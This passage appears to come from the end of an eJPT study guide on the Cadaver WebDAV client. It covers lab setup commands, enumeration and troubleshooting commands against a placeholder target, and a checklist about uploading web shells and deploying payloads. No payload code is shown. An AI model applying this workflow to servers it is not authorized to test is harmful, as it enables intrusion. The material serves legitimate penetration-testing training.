- **VulnHub:** WebDAV-enabled vulnerable machines for hands-on practice
- **HackTheBox:** Machines featuring WebDAV services in realistic scenarios
- **TryHackMe:** Web application penetration testing rooms with guided exercises
- **DVWA (Damn Vulnerable Web Application):** File upload testing scenarios

#### **Local Lab Setup Instructions:**
```bash
# Apache WebDAV Setup (Ubuntu/Debian)
sudo apt install apache2
sudo a2enmod dav dav_fs
sudo mkdir /var/www/webdav
sudo chown www-data:www-data /var/www/webdav

# Basic WebDAV configuration
echo 'Alias /webdav /var/www/webdav
<Directory "/var/www/webdav">
    Dav On
    AuthType Basic
    AuthName "WebDAV"
    AuthUserFile /etc/apache2/webdav.passwd
    Require valid-user
</Directory>' | sudo tee /etc/apache2/sites-available/webdav.conf

# Create user for testing
sudo htpasswd -c /etc/apache2/webdav.passwd testuser

# Enable site and restart Apache
sudo a2ensite webdav
sudo systemctl restart apache2
```

### **🔧 Complementary Tools for Enhanced Workflow:**

#### **Primary Integration Tools:**
- **DavTest:** Automated WebDAV vulnerability assessment and capability testing
- **Curl:** Alternative HTTP client for WebDAV operations and verification
- **Nmap:** WebDAV service discovery and enumeration with specialized scripts
- **Burp Suite:** Advanced WebDAV request manipulation and traffic analysis

#### **Secondary Support Tools:**
- **Nikto:** Web server vulnerability scanning including WebDAV-specific checks
- **Dirb/Dirbuster:** Directory enumeration for WebDAV path discovery
- **WebShells Collection:** Various payload types for different server technologies
- **Metasploit Framework:** Automated exploitation modules for WebDAV vulnerabilities

#### **File Analysis Tools:**
- **Strings:** Extract readable text from downloaded binary files
- **File:** Identify file types and formats of downloaded content
- **Hexdump:** Binary analysis of configuration files and data
- **Grep/Awk/Sed:** Text processing for log analysis and credential extraction

---

## 📞 Comprehensive Help & Support

### **🆘 Emergency Troubleshooting Procedures:**

#### **Quick Diagnostic Commands:**
```bash
# Network connectivity verification
ping target_ip && echo "Host reachable" || echo "Host unreachable"

# Port accessibility testing
nmap -p 80,443,8080 target_ip

# Manual HTTP testing
curl -I http://target/webdav/
curl -u username:password http://target/webdav/

# WebDAV method verification  
curl -X OPTIONS http://target/webdav/ | grep -i dav

# Debug mode connection
cadaver --debug http://target/webdav

# Alternative connection formats
cadaver http://username:password@target/webdav
cadaver https://target/webdav
```

#### **Common Resolution Strategies:**
1. **Connection Issues:** Verify network path, try different ports/protocols
2. **Authentication Problems:** Test credentials with curl, check for special characters
3. **Upload Failures:** Try different directories, verify file permissions
4. **Interactive Problems:** Restart session, use explicit command syntax

### **💬 Community Support Networks:**

#### **Professional Forums:**
- **WebDAV Technical Forums:** Protocol-specific discussions and troubleshooting
- **Penetration Testing Communities:** Reddit r/netsec, r/AskNetsec for practical advice
- **Security Discord Servers:** Real-time help and collaborative problem-solving
- **OWASP Local Chapters:** In-person networking and knowledge sharing

#### **Academic Resources:**
- **University Security Programs:** Research papers and advanced techniques
- **Security Conference Presentations:** Black Hat, DEF CON, BSides presentations
- **Security Blogs:** Technical write-ups and real-world case studies
- **Vendor Documentation:** Official security guidance and best practices

### **🎯 eJPT-Specific Support Resources:**

#### **Official Certification Materials:**
- **eJPT Study Guide:** Official WebDAV exploitation modules and exercises
- **Practice Lab Environments:** Hands-on WebDAV scenarios in controlled settings
- **Study Groups:** Collaborative learning and exam preparation sessions
- **Certification Forums:** eJPT-specific discussions, tips, and success strategies

#### **Exam Preparation Resources:**
- **Mock Exam Platforms:** Simulated testing environments with time constraints
- **Study Partner Networks:** Peer learning and knowledge verification
- **Mentor Programs:** Guidance from certified professionals
- **Success Stories:** Learning from others' certification experiences

---

## 📋 Final Checklist for Cadaver Mastery

### **✅ Technical Skills Verification:**
- [ ] Successfully connect to WebDAV servers with various authentication methods
- [ ] Upload web shells efficiently and verify successful deployment
- [ ] Navigate directory structures and download configuration files
- [ ] Create organized directory layouts for team operations
- [ ] Troubleshoot common connection and upload issues independently
- [ ] Integrate Cadaver operations with DavTest findings effectively

### **✅ Exam Readiness Assessment:**
- [ ] Complete web shell upload scenarios within 5-7 minute timeframes
- [ ] Demonstrate file download and intelligence gathering capabilities
- [ ] Execute organized multi-payload deployment efficiently
- [ ] Document findings professionally for reporting requirements
- [ ] Handle authentication failures and recovery procedures
- [ ] Maintain operational security and cleanup procedures

### **✅ Professional Competency Standards:**
- [ ] Understand ethical boundaries and authorized testing scope
- [ ] Maintain detailed logs and evidence collection
- [ ] Communicate findings effectively to team members
- [ ] Follow industry best practices for WebDAV exploitation
- [ ] Stay current with security developments and tool updates
- [ ] Contribute to knowledge sharing and community learning

This comprehensive guide provides the foundation for mastering Cadaver as both a penetration testing tool and an essential component of the eJPT certification preparation. Regular practice with the provided examples and scenarios will build the confidence and competency needed for successful WebDAV exploitation in professional security assessments.
